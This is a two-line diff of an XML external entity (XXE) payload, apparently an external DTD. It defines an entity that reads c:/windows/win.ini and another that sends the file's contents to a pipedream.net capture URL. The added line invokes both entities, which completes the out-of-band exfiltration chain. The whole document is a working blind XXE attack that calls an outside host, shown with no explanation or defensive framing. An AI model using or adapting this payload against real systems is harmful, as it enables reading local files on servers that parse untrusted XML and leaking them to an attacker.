@@ -1,2 +1,2 @@
 <!ENTITY % filenew SYSTEM "file:///c:/windows/win.ini">
-<!ENTITY % x '<!ENTITY % send SYSTEM "https://enllfgxx7hk1e.x.pipedream.net/1.asp/%filenew;">'>
+<!ENTITY % x '<!ENTITY % send SYSTEM "https://enllfgxx7hk1e.x.pipedream.net/1.asp/%filenew;">'> %x; %send;
